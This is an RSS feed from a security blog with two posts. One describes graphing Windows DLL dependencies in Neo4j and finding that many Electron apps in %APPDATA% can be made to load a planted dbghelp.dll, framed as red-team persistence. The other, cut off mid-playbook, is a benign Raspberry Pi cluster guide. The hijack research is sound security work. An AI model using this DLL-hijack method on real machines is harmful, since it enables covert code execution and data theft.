<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on [audible]blink</title>
        <link>https://ctrl.red/posts/</link>
        <description>Recent content in Posts on [audible]blink</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Tue, 25 Jan 2022 16:50:47 -0400</lastBuildDate>
        <atom:link href="https://ctrl.red/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Accidentally Graphing DLL Hijacks in Every Electron App</title>
            <link>https://ctrl.red/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/</link>
            <pubDate>Tue, 25 Jan 2022 16:50:47 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/</guid>
            <description>or Building Your Own Binoculars
I like this bi-line for a couple of reasons.
 It touches on self-sufficiency in the face of necessity It could bring up one of two things  You may be too far from the problem. Think about how to get closer You may not be seeing the forest for the trees. Being an expert on something can make it difficult to have an objective/practical opinion about the downstream effects your specialty has on the world around you.</description>
            <content type="html"><![CDATA[<p><em>or Building Your Own Binoculars</em></p>
<p>I like this bi-line for a couple of reasons.</p>
<ul>
<li>It touches on self-sufficiency in the face of necessity</li>
<li>It could bring up one of two things
<ul>
<li>You may be too far from the problem. Think about how to get closer</li>
<li>You may not be seeing the forest for the trees. Being an expert on something can make it difficult to have an objective/practical opinion about the downstream effects your specialty has on the world around you.</li>
</ul>
</li>
<li>Building tools to solve a problem reveals perspectives to the problem you did not anticipate</li>
<li>I recently finished reading &ldquo;Paddle Your Own Canoe&rdquo; by Nick Offerman and wanted a cool title like his</li>
</ul>
<p>In my research, it often takes me a while to get started because I <del>procrastinate</del> spend so much time building tools to facilitate the research. I try to anticipate my needs, and set myself up to easily pivot, if need be. I do my best to ensure a fast feedback loop, allowing fast failures and restarts. Failures are still data. To twist the colloquialism: Sharpen your axe before chopping down trees.</p>
<p>Some time ago, while hashing out what to build into an application, I received some advice that&rsquo;s helped me in various technical and non-technical aspects of my life:</p>
<blockquote>
<p>Don&rsquo;t anticipate details. Therein lies madness.
Instead, only anticipate change, and build what&rsquo;s needed to facilitate that change.</p>
</blockquote>
<p>There&rsquo;s you daily does of <strong>Zen and the Art of Motorcycle Maintenance</strong></p>
<h2 id="prior-work">Prior Work</h2>
<p>Below is a list of related work I encountered throughout the life-cycle of this project. This would
have been much more painful without you all. Thank you:</p>
<ul>
<li><a href="https://redteamer.tips/appdata-is-a-mistake-introducing-invoke-dllclone/">%appdata% is a mistake</a>: Jean Maes</li>
<li><a href="https://blog.xpnsec.com/analysing-rpc-with-ghidra-neo4j/">Analysing RPC with Ghidra and neo4j</a>: Adam Chester aka @<em>xpn</em></li>
<li><a href="https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0">Automating DLL Hijack Discovery</a>: Justin Bui aka @slyd0g</li>
<li><a href="https://firefistace153.medium.com/using-slack-whatsapp-electron-apps-for-malware-attack-5b5b40efba2c">Using Slack, WhatsApp (electron Apps) for malware attack</a></li>
</ul>
<h2 id="initial-threads">Initial Threads</h2>
<p>I&rsquo;m not a smart man when it comes to things like Threat Intelligence or Malware Reversing. Hoping to remedy that problem, I picked up <a href="https://nostarch.com/malwaredatascience">Malware Data Science</a> by Joshua Saxe with Hillary Sanders. There&rsquo;s a section about judging the actions of malware based on the functionality it imports from other dependencies.</p>
<p>I began thinking about collecting that information from known good binaries; what&rsquo;s the baseline for good?</p>
<p>In a separate mental thread, I had been playing with Google&rsquo;s project dependency mapper, <a href="https://deps.dev">deps.dev</a>. It&rsquo;s pretty wild seeing the relationships between all these different OSS projects graphed out in such a visually impactful way. During the Great Left-Pad debacle in the node.js ecosystem, their community caught a lot of snark for its tendency to pull in dependencies for seemingly trivial tasks.</p>
<blockquote>
<p><a href="https://www.npmjs.com/package/is-even">Is-Even</a>, which does exactly what you&rsquo;re thinking and nothing more, is downloaded 200k times a week</p>
</blockquote>
<p>When a developer of a particular package deleted his code from the repository whence node packages are fetched, new attempts to rebuild projects that depended on it would simply fail to build.</p>
<blockquote>
<p>A note on Left Pad: If you know what this was, skip ahead.
Left-Pad was a node.js package that would take an input, and pad it with whatever you wanted on the left side, as many times as you wanted. If you passed it 1234, and the number 0 for the padding, and the number 8, for the desired total length, it would return 00001234.
It turns out some very big projects imported this dependency. Sometimes not even directly! It was an indirect dependency, meaning it was a dependency of a dependency of a dependency&hellip; etc. One such project was React.js. All over the world developers ran into failures, CI pipelines failed to deploy, and many hours (and dollars) were lost that day.</p>
</blockquote>
<p>Was the snark justified? I mean, how new was this problem of dependency hell? The threads have come
together.</p>
<h2 id="formation-of-the-project">Formation of the Project</h2>
<p>Since any good experiment begins with a question:</p>
<ul>
<li>If we knew all the direct and indirect dependencies on a Windows system:
<ul>
<li>Could we find &ldquo;lolbins&rdquo; in the form of imported dependencies?</li>
<li>How quickly could we analyze the blast radius if it became known that a particular dependency had a vulnerability</li>
<li>In knowing what processes would have what loaded functions by default, could we make those processes do things they wouldn&rsquo;t normally do and would anyone be able to tell?</li>
</ul>
</li>
</ul>
<h2 id="initial-research">Initial Research</h2>
<p>In order to collect the data, I needed a way to quickly pull dependencies from all PEs on disk.</p>
<blockquote>
<p>PE stands for Portable Executable. Their structure follows a predefined set of rules, or specifications. EXEs and DLLs are both PEs.</p>
</blockquote>
<p>I also knew I wanted get a visual representation of these dependencies. My thought was to create something that would allow for the easy ingestion of data into Neo4j, a graph database. You may be familiar with this if you&rsquo;ve ever used Bloodhound.</p>
<p>Wanting to be able to test a single PE using any OS, and also to have a portable tool I can use on many different versions of fresh Windows installs, I chose Golang and I built <code>ino</code> - <a href="https://github.com/audibleblink/ino/tree/v0.0.1">https://github.com/audibleblink/ino/tree/v0.0.1</a></p>
<p>Being new to the PE format, I discovered a few things at this point in my journey:</p>
<ul>
<li>PE files can import other PEs, regardless of extension
<ul>
<li>EXEs can import DLLs</li>
<li>DLLs can import DLLs</li>
<li>DLLs can import EXEs</li>
<li>EXEs can import EXEs</li>
<li>Both can export functions</li>
</ul>
</li>
<li>PE files have Forwards
<ul>
<li>A PE can Export a function that it itself does not define</li>
<li>It&rsquo;s a form of Export that merely points to a different DLL&rsquo;s export</li>
</ul>
</li>
</ul>
<p>To <code>ino</code>, I added the ability to collect Forwards as well. I also added the ability for <code>ino</code> itself to recursively search for PEs, given a starting directory. This brings us to v0.1.2 - <a href="https://github.com/audibleblink/ino/tree/v0.1.2">https://github.com/audibleblink/ino/tree/v0.1.2</a></p>
<h3 id="the-data">The Data:</h3>
<p>Collection of the data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ino.exe -dir c:<span style="color:#ae81ff">\ </span>-type dll &gt; dlls.json
</code></pre></div><p>Resulting JSON:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">ino</span> <span style="color:#960050;background-color:#1e0010">-v</span> <span style="color:#960050;background-color:#1e0010">comsvcs.dll</span>

{
  <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;comsvcs.dll&#34;</span>,
  <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;C:\Windows\system32&#34;</span>,
  <span style="color:#f92672">&#34;Imphash&#34;</span>: <span style="color:#e6db74">&#34;...&#34;</span>,
  <span style="color:#f92672">&#34;Imports&#34;</span>: [<span style="color:#960050;background-color:#1e0010">...</span>],
  <span style="color:#f92672">&#34;Exports&#34;</span>: [<span style="color:#960050;background-color:#1e0010">...</span>],
  <span style="color:#f92672">&#34;Forwards&#34;</span>: [<span style="color:#960050;background-color:#1e0010">...</span>],
  <span style="color:#f92672">&#34;PDB&#34;</span>: <span style="color:#e6db74">&#34;...&#34;</span>,
  <span style="color:#f92672">&#34;Sections&#34;</span>: [<span style="color:#960050;background-color:#1e0010">...</span>],
}
</code></pre></div><p>With the data collected from about 86K PEs on a fresh install of Windows, I moved on to importing to and visualizing with Neo4j.</p>
<h2 id="first-round-of-analysis">First Round of Analysis</h2>
<p>Neo4j is a graph database that surfaces relationships between pieces of data. You may be familiar with traditional databases that hold mass amounts of information, and yes, can correlate separate tables with Joins. While Neo can hold data for each table row (aka Node in Neo-speak), it&rsquo;s purpose is to shine a light on the &ldquo;Joins&rdquo;. It&rsquo;s an oversimplification, but if you were unfamiliar with Neo4j before this article, knowing that should get you through the rest of this part.</p>
<p>A lot of it&rsquo;s power comes from not needing to know any intermediary nodes or attributes to surface relationships. You simply ask it, &ldquo;What&rsquo;s the shortest path between Node A and Node B?&rdquo;. If ever there was a way to find exactly just how many degrees you&rsquo;re separated from Kevin Bacon, this is it.</p>
<h3 id="the-model">The Model:</h3>
<p><img src="1.png" alt=""></p>
<blockquote>
<p>Fail log: I should have created the model first. The tool influenced how I though about the graph. In retrospect, the Function name should have been its own node. Thanks to some very helpful conversations with Andy Robbins aka @wald0, I learne that anything you want to search by should be a node and not a property on that node or edge. Doing so will increase query time substantially.</p>
</blockquote>
<blockquote>
<p>Something like this would have been a more useful model:</p>
</blockquote>
<pre tabindex="0"><code>&gt; (EXE)-[:IMPORTS]-(:FUNCTION)-[:DEFINED_BY]-(DLL)-[:FORWARDS]-(FUNCTION)-[:FORWARDED_TO]-&gt;(DLL)
</code></pre><p>and the ingestion:</p>
<pre tabindex="0"><code class="language-cypher" data-lang="cypher">CALL apoc.load.json(&quot;file:///sys32_dll.json&quot;) 
YIELD value AS dllData
MERGE (dll:DLL {name: dllData.Name, complete: false})
SET dll.exports = dllData.Exports
SET dll.path = dllData.Path
SET dll.imphash = dllData.ImpHash
SET dll.complete =  true

WITH dll, dllData UNWIND dllData.Imports AS import
MERGE (dll1:DLL {name: import.Host})
FOREACH (i in CASE WHEN dll1.complete THEN [] ELSE [1] END |
	SET dll1.complete = false)
WITH dll, dll1, import, dllData UNWIND import.Functions as func
MERGE (dll)-[:IMPORTS {fn: func}]-&gt;(dll1)

WITH dll, dllData UNWIND dllData.Forwards AS fwd
MERGE (dll3:DLL {name: fwd.Host})
FOREACH (i in CASE WHEN dll3.complete THEN [] ELSE [1] END |
	SET dll3.complete = false)
WITH dll, dll3, fwd UNWIND fwd.Functions as func
MERGE (dll)-[:FORWARDS {fn: func}]-&gt;(dll3)

</code></pre><p>The ingestion was intense and took me several hours to build, and this was a relatively simple model. Let&rsquo;s explain this query a chunk at a time.</p>
<ul>
<li><code>apoc.load.json() yeild value as dllData</code> will import some JSON, iterate through the lines, giving you access to each as the variable <code>dllData</code>
<ul>
<li><code>dllData</code> is the JSON from a few lines up</li>
</ul>
</li>
<li><code>MERGE (dll:DLL {...}</code> will attempt to find, and if not found, creates a DLL node with the included properties
<ul>
<li><code>complete</code> indicates if this DLL has been processed because it was one of the JSON line. I set it to true in 4 lines, because if it&rsquo;s running through this loop, it is a JSON object</li>
<li>This script adhoc creates other PE nodes when iterating through Imports and Forwards. In that data, the properties <code>exports, path, imphash</code> are not present
<ul>
<li>In those cases, somewhere down the line I may run into that actual location of those adhoc nodes. I want to find them, instead of creating new ones</li>
</ul>
</li>
</ul>
</li>
<li><code>WITH dll, dllData UNWIND dllData.Imports AS import</code> - sets up an iteration the <code>imports</code> array, while giving us access to the <code>dll, dllData</code> variables.</li>
<li><code>MERGE ()</code> - Find or create this node which is an import of our top-level node. The one we&rsquo;re currently iterating through from our JSON.</li>
<li><code>FOREACH ...</code> - Neo doesn&rsquo;t have IF/ELSE conditions, so this little hack uses the <code>complete</code> flag to determine whether or not this a complete node or an adhoc one, with incomplete information. If it&rsquo;s incomplete, we set the <code>false</code> flag</li>
<li><code>WITH dll, dll3, fwd UNWIND fwd.Functions as func</code> - another loop to create the relationship between our top-level DLL and the current iteration of the <code>Imports</code> array
<ul>
<li><code>MERGE (dll)-[:IMPORTS {fn: func}]-&gt;(dll1)</code></li>
</ul>
</li>
<li>The next section repeats this logic, but for Forwards</li>
</ul>
<blockquote>
<p>Fail log: Don&rsquo;t do this ^. It&rsquo;s error-prone and slow to seed. Instead focus on
creating the nodes. Then as a post-processing step, create the relationships.
An example:</p>
</blockquote>
<pre tabindex="0"><code class="language-cypher" data-lang="cypher">CALL apoc.periodic.iterate(
				&quot;MATCH (node:%s),(dir:Directory) WHERE node.parent = dir.path RETURN node,dir&quot;,
				&quot;MERGE (dir)-[:CONTAINS]-&gt;(node)&quot;,
				{batchSize:100, parallel: true, iterateList:true})
</code></pre><blockquote>
<p>Arg 1: find related nodes with a query,<br>
Arg 2: action to take on each returned &ldquo;row&rdquo;<br>
Arg 3: go really fast</p>
</blockquote>
<h3 id="visualization">Visualization</h3>
<p>Now we&rsquo;re getting to the fun part. With all of the nodes and relationships set, we can begin exploring.</p>
<p>Due to some other recent but unrelated work, I had a particular interest in anyone who imports <code>dbghelp.dll!MiniDumpWriteDump</code>.</p>
<p><img src="2.png" alt=""></p>
<blockquote>
<p>Fail log: My logic for not creating duplicates was flawed</p>
</blockquote>
<p>What are some other queries we can run, knowing how our data all fits together?</p>
<ul>
<li>Show me all DLLs with a FORWARD</li>
<li>Who imports a particular DLL?</li>
<li>Who imports a particular Function?</li>
<li>Show me all DLLs imported by a certain EXE</li>
</ul>
<p>It was around this time a report comparing different EDRs was making the rounds. Results indicated that execution via DLL loads were hardly caught. If we&rsquo;re just talking execution (or persistence), and not privesc, where are there programs installed that run regularly and whose directories are probably writable? Looking at you, %APPDATA%.</p>
<p>Let&rsquo;s continue playing with <code>dbghelp</code> Given we have a <code>Path</code> attribute where every PE is located&hellip;</p>
<p><img src="3.png" alt=""></p>
<p><strong>very interesting</strong></p>
<p>Out of all the EXEs in APPDATA, why these? With the exception of maybe 2, I noticed that they&rsquo;re all Electron apps.</p>
<p>Let me pause here and say, that the search order path in Windows is indeed a feature. This isn&rsquo;t very exciting or new. At best we have code execution or persistence. Teams.exe may be worth noting, since it&rsquo;s signed by Microsoft. The interesting part here, I think, is for objective-based Red Teams. Red Teams aren&rsquo;t in a hurry to exploit the world. Depending on the objective, gathering information which leads to objectives is key. I&rsquo;ll be honest, Red Teaming can sometime be down-right boring. Sometimes it&rsquo;s kicking in (metaphorical) doors but sometimes it&rsquo;s just a stakeout.</p>
<p>I googled around for similar research to see if anyone had beaten me to the punch.</p>
<ul>
<li><code>electron AND dbghelp.dll</code></li>
<li><code>electron AND search order</code></li>
<li><code>electron AND hijack</code></li>
</ul>
<p>These 2 results came back as relevant:</p>
<ul>
<li><a href="https://firefistace153.medium.com/using-slack-whatsapp-electron-apps-for-malware-attack-5b5b40efba2c">Using Slack, WhatsApp (electron Apps) for malware attack</a></li>
<li>This <a href="https://github.com/electron/electron/issues/28384">issue</a> on Electron&rsquo;s GitHub Repo.</li>
</ul>
<p>The first one details the hijacking I&rsquo;ve covered, and the author goes on to PoC planting the DLL with a maldoc.</p>
<p>The second is an Issue from March 2021 listing even more DLLs than what I found with static analysis. I fired up Procmon, and sure enough, many of these are lazy-loaded, thus not existing in the Import Address Table.</p>
<h2 id="conclusion">Conclusion</h2>
<p>By mapping out relationships of PEs and their dependencies, we&rsquo;ve discovered a universal way to load code into any Electron app, of which there are thousands. The possibilities are exciting when you consider what kind of data is handled by certain Electron apps with which you now get to share memory address space with.</p>
<p>This first go has reminded me of the importance of patience in scoping and defining your work. It
keeps it targeted and on track. It can also prevent you from having to restart over and over again.
Learning by doing is great, but humans have the capacity to learn from the mistakes of others.
Learning to use both methods is challenging, but rewarding.</p>
<p>A relevant thread I wish I&rsquo;d considered before starting:</p>
<p><img src="5.png" alt=""></p>
<p>At this point, I think I&rsquo;ve reached the end of this particular data-set&rsquo;s utility.</p>
<p>After satisfying the occasional curiosity of &ldquo;who imports/forwards what&rdquo;,
I&rsquo;ve pivoted to something that hopefully is more impactful.</p>
<h2 id="whats-next">What&rsquo;s Next</h2>
<p>One additional question did come up during this side quest.</p>
<p>What if an Exe&rsquo;s imports can&rsquo;t be
hijacked because the imported Dll is in the same directory as the Exe, BUT, that Dll forwards a
function to another Dll that isn&rsquo;t in the same directory?</p>
<p>And what if that process is running as
SYSTEM?</p>
<p>I&rsquo;m currently shaking that tree and I hope to have that blog written up soon. Here&rsquo;s a preview.</p>
<p><a href="4.png"> <img src="4.png"/> </a></p>
<meta name="description" content="Accidentally Graphing DLL Hijacks in Every Electron App            ">
<!-- Facebook Meta Tags -->
<meta property="og:url" content="https://sec.alexflor.es/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/">
<meta property="og:type" content="website">
<meta property="og:title" content="Building Your Own Binoculars">
<meta property="og:description" content="Accidentally Graphing DLL Hijacks in Every Electron App            ">
<meta property="og:image" content="https://sec.alexflor.es/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/4.png">
<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:domain" content="sec.alexflor.es">
<meta property="twitter:url" content="https://sec.alexflor.es/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/">
<meta name="twitter:title" content="Building Your Own Binoculars">
<meta name="twitter:description" content="Accidentally Graphing DLL Hijacks in Every Electron App            ">
<meta name="twitter:image" content="https://sec.alexflor.es/posts/2022/01/accidentally-graphing-dll-hijacks-in-every-electron-app/4.png">
]]></content>
        </item>
        
        <item>
            <title>Clustering Pi Zeros With ClusterHAT, Docker Swarm, Traefik, and Ansible</title>
            <link>https://ctrl.red/posts/2021/11/clustering-pi-zeros-with-clusterhat-docker-swarm-traefik-and-ansible/</link>
            <pubDate>Wed, 10 Nov 2021 00:00:00 +0000</pubDate>
            
            <guid>https://ctrl.red/posts/2021/11/clustering-pi-zeros-with-clusterhat-docker-swarm-traefik-and-ansible/</guid>
            <description>It calls to you. Your drawer of misfit toys and abandoned projects.
Every few months, I come back to the world of SoCs to see what&amp;rsquo;s new, but nothing ever really sticks around long enough for it to be considered useful enough to be permanent.
 Smart mirrors Twitter bots that shame you for not watering your plants Video Game emulators Home control devices The occasional GPIO project to manipulate things in MeatSpace  The only exception is probably an ad-blocking DNS server, the Pi-Hole.</description>
            <content type="html"><![CDATA[<p><img src="0.png" alt=""></p>
<hr>
<p><strong>It calls to you.</strong> Your drawer of misfit toys and abandoned projects.</p>
<p>Every few months, I come back to the world of SoCs to see what&rsquo;s new, but nothing
ever really sticks around long enough for it to be considered useful enough to be permanent.</p>
<ul>
<li>Smart mirrors</li>
<li><a href="https://twitter.com/thirstyplant1">Twitter bots that shame you</a> for not watering
your plants</li>
<li>Video Game emulators</li>
<li>Home control devices</li>
<li>The occasional GPIO project to manipulate things in MeatSpace</li>
</ul>
<p>The only exception is probably an ad-blocking DNS server, the Pi-Hole. But even that&rsquo;s been
graduated to running as distributed Linux Containers (<a href="https://linuxcontainers.org">LXC</a>)</p>
<p>All that said, this project is also probably drawer-bound, but at least it was fun!</p>
<h2 id="the-clusterhat">The ClusterHAT</h2>
<p><img src="1.jpg" alt=""></p>
<blockquote>
<p><a href="https://www.sparkfun.com/products/18155">https://www.sparkfun.com/products/18155</a></p>
</blockquote>
<p>The ClusterHAT sits atop a traditional Raspberry Pi, aka a HAT (Hardware Attached on Top. Yes,
really). It has slots for you to insert 4 Raspberry Pi Zeros. When Gadget Mode is enabled, and
the Zeros attach to the HAT, they become their own little subnet, branching off the main Pi.</p>
<blockquote>
<p>Gadget Mode enables networking over USB</p>
</blockquote>
<p>If comparing to a traditional network setup, we might think of the HAT like a network switch.
When you combine the HAT with the modified Raspbian ISOs provided by <a href="https://www.8086.net">8086</a>,
in a couple of minutes you have a little cluster of Pis, ready to do your bidding.</p>
<h3 id="setup">Setup</h3>
<p>The instruction over at <a href="https://clusterhat.com/setup-overview">https://clusterhat.com/setup-overview</a> are pretty clear, but in summary:</p>
<ul>
<li>The main Pi has its own ISO, which comes in two flavors:
<ul>
<li>CNAT - Pi Zeros are served IPs from the main Pi in the 172.19.181/24 range</li>
<li>CBRIDGE - All 5 Pis are on the same network as you</li>
</ul>
</li>
<li>Pi Zeros get there own corresponding, numbered ISO
<ul>
<li>Pi #1 gets ISO P1, and is assigned 172.18.181.1
<ul>
<li><em>if using the CNAT image</em></li>
</ul>
</li>
<li>Pi #2 gets ISO P2, and is assigned 172.18.181.2</li>
<li>and so on</li>
</ul>
</li>
</ul>
<p><a href="https://8086.support/index.php?action=faq&amp;cat=23&amp;id=97&amp;artlang=en">You <em>can</em> netboot</a>
all of the Zeros from the main Pi&rsquo;s, but keep in mind you&rsquo;d be sharing a single sdcard between 5
operating systems. It&rsquo;s cool to see, if you have the time, but it might not be an ideal long term
solution. <code>apt upgrade</code> on 5 nodes took about an hour. YMMV since sdcards come in a variety of
speeds.</p>
<p><a href="https://8086.support/content/23/97/en/how-do-i-boot-pi-zeros-without-sd-cards-cluster-hat_cluster-ctrl.html">Netboot instructions here</a></p>
<p>Once all the sdcards are flashed, (or netboot shares copied), make sure to <code>touch /boot/ssh</code> on
each node to enable remote access.</p>
<h3 id="connecting-to-the-pis">Connecting to the Pis</h3>
<p>Place your Zeros in the ClusterHat&rsquo;s ports and attach the ClusterHat to the main Pi.</p>
<p>Boot up the main Pi, SSH in, and supply power to the Zeros with:</p>
<pre tabindex="0"><code>clusterctrl up p{1,2,3,4}
</code></pre><p>Let&rsquo;s talk about the CNAT image. The Zeros aren&rsquo;t directly accessible from your main LAN. Instead
of SSHing to the main Pi, then SSHing again to each Zero, we can simplify the process by
setting the main Pi, which <em>is</em> on your direct physical network, as an SSH ProxyJump.</p>
<p>In your ~/.ssh/config file, put in the following, with modifications for your hostnames and IPs, of
course:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hcl" data-lang="hcl"><span style="color:#66d9ef">Host</span> <span style="color:#960050;background-color:#1e0010">*</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
  <span style="color:#66d9ef">ProxyJump</span> <span style="color:#66d9ef">hammond</span>
  <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Pi</span>

<span style="color:#66d9ef">Host</span> <span style="color:#66d9ef">hammond</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
    <span style="color:#66d9ef">HostName</span> <span style="color:#ae81ff">192</span>.<span style="color:#ae81ff">168</span>.<span style="color:#ae81ff">42</span>.<span style="color:#ae81ff">10</span>

<span style="color:#66d9ef">Host</span> <span style="color:#66d9ef">oneil</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
    <span style="color:#66d9ef">HostName</span> <span style="color:#ae81ff">172</span>.<span style="color:#ae81ff">19</span>.<span style="color:#ae81ff">181</span>.<span style="color:#ae81ff">1</span>

<span style="color:#66d9ef">Host</span> <span style="color:#66d9ef">carter</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
    <span style="color:#66d9ef">HostName</span> <span style="color:#ae81ff">172</span>.<span style="color:#ae81ff">19</span>.<span style="color:#ae81ff">181</span>.<span style="color:#ae81ff">2</span>

<span style="color:#66d9ef">Host</span> <span style="color:#66d9ef">tealc</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
    <span style="color:#66d9ef">HostName</span> <span style="color:#ae81ff">172</span>.<span style="color:#ae81ff">19</span>.<span style="color:#ae81ff">181</span>.<span style="color:#ae81ff">3</span>

<span style="color:#66d9ef">Host</span> <span style="color:#66d9ef">danieljackson</span>.<span style="color:#66d9ef">chappa</span>.<span style="color:#66d9ef">ai</span>
    <span style="color:#66d9ef">HostName</span> <span style="color:#ae81ff">172</span>.<span style="color:#ae81ff">19</span>.<span style="color:#ae81ff">181</span>.<span style="color:#ae81ff">4</span>
</code></pre></div><p>You can then copy your ssh public key to each host with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> name in <span style="color:#f92672">{</span>hammond,oneil,carter,tealc,danieljackson<span style="color:#f92672">}</span>.chappa.ai ; <span style="color:#66d9ef">do</span>
  ssh-copy-id -i ~/.ssh/id_ed25519 <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Enter your passwords and you should now be set up for password-less ssh, which we&rsquo;ll need later to
continue installing Docker on each node with Ansible.</p>
<p>On each Pi, run through the menu at <code>sudo raspi-config</code>. Spend as much or as little time as you
want here. I usually just go with:</p>
<p><img src="2.png" alt=""></p>
<ol>
<li>System Options</li>
</ol>
<ul>
<li>change password</li>
<li>change hostname</li>
</ul>
<ol start="4">
<li>Performance Options</li>
</ol>
<ul>
<li>reduce gpu memory to 16</li>
</ul>
<ol start="6">
<li>Advance Options</li>
</ol>
<ul>
<li>expand memory card</li>
</ul>
<h2 id="docker-prep-with-ansible">Docker Prep With Ansible</h2>
<p>Raspberry Pis need to have some options enabled before containers are able to run.</p>
<p>Later, we&rsquo;ll append to their <code>/boot/cmdline.txt</code> the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hcl" data-lang="hcl">cgroup_memory<span style="color:#f92672">=</span>1 cgroup_enable<span style="color:#f92672">=</span>memory cgroup_enable<span style="color:#f92672">=</span><span style="color:#66d9ef">cpuset</span>
</code></pre></div><p>This tells the kernel to allow the use of <code>cgroups</code>, or &ldquo;control groups&rdquo;. Docker containers are just
a scoped set of process and resources on your computer. Containers were around long before Docker,
which made the use of Linux Namespaces and CGroups more accessible.</p>
<h3 id="a-small-tangent-on-containers">A Small Tangent on Containers</h3>
<blockquote>
<p>Containers are logical units of Linux kernel features, distributed as tarballs, whose processes
are anchored to namespaces and controlled by CGroups.</p>
</blockquote>
<h4 id="why-are-namespaces">Why are Namespaces</h4>
<p>To create a Namespace for a process, additional flags must be passed to process-creation syscalls.
These additional flags can restrict what this process can see and what other processes can see
about it</p>
<p><strong>Other things you can namespace</strong></p>
<ul>
<li>Hostnames</li>
<li>Process IDs</li>
<li>Filesystems</li>
<li>IPC</li>
<li>Networking</li>
<li>User IDs</li>
</ul>
<h4 id="why-are-cgroups">Why are CGroups</h4>
<p>At its most basic? They allow you to control, audit, and limit how your system&rsquo;s resources are
accessed or used.</p>
<ul>
<li><strong>Resource limiting</strong> Groups can be set to not exceed a configured memory limit</li>
<li><strong>Prioritization</strong> Some groups may get a larger share of CPU or disk I/O</li>
<li><strong>Accounting</strong> Measures a group&rsquo;s resource usage</li>
<li><strong>Control</strong> Freezing groups of processes</li>
</ul>
<p>What sorts of things can we control?</p>
<ul>
<li>Memory: <code>/sys/fs/cgroup/memory</code></li>
<li>CPU/Cores <code>/sys/fs/cgroup/cpu*</code></li>
<li>I/O <code>/sys/fs/cgroup/blkio</code></li>
<li>Processes <code>/sys/fs/cgroup/cgroup.procs</code></li>
<li>Devices <code>/sys/fs/cgroup/devices.*</code></li>
</ul>
<h3 id="automating-setup">Automating Setup</h3>
<p>If we&rsquo;re interested in following along, all the playbooks can be found here:
<a href="https://github.com/audibleblink/clusterctrl-ansible/">https://github.com/audibleblink/clusterctrl-ansible/</a></p>
<p>First, we&rsquo;ll need to setup our inventory file and name our groups. Below is one possible
configuration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml"><span style="color:#75715e"># file: inventory.ini</span>
[<span style="color:#a6e22e">clusterctrl_server</span>]
<span style="color:#a6e22e">hammond</span>


[<span style="color:#a6e22e">clusterctrl_nodes</span>]
<span style="color:#a6e22e">oneil</span>
<span style="color:#a6e22e">carter</span>
<span style="color:#a6e22e">tealc</span>
<span style="color:#a6e22e">danieljackson</span>


[<span style="color:#a6e22e">clusterctrl</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#a6e22e">children</span>]
<span style="color:#a6e22e">clusterctrl_server</span>
<span style="color:#a6e22e">clusterctrl_nodes</span>

</code></pre></div><p>If you&rsquo;d like, create an <code>ansible.cfg</code> to save a couple keystrokes when calling <code>ansible-playbook</code>.
Otherwise you&rsquo;d need to specify an inventory file each time.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[defaults]</span>
<span style="color:#a6e22e">inventory</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">./inventory.ini</span>
<span style="color:#a6e22e">interpreter_python</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/usr/bin/python3</span>
</code></pre></div><p>The following task ensures, in an idempotent way, that our kernel flags exist on all our Pis, and
reboots the Pi if the flags weren&rsquo;t already there.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">---

- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Enable container features</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">register</span>: <span style="color:#ae81ff">containers_enabled</span>
  <span style="color:#f92672">replace</span>:
    <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/boot/cmdline.txt</span>
